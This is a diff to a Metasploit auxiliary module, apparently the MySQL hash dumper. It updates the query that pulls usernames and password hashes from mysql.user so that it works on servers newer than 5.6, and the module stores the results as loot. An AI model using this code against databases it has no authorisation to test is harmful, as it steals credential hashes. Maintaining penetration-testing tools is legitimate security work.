@@ -57,7 +57,12 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
 
     #Grabs the username and password hashes and stores them as loot
-    res = mysql_query("SELECT user,password from mysql.user")
+    version = mysql_get_variable("@@version")
+    if (5.6 < version[0..2].to_f)
+        res = mysql_query("SELECT user,authentication_string from mysql.user")
+    else 
+        res = mysql_query("SELECT user,password from mysql.user")
+    end
     if res.nil?
       print_error("There was an error reading the MySQL User Table")
       return
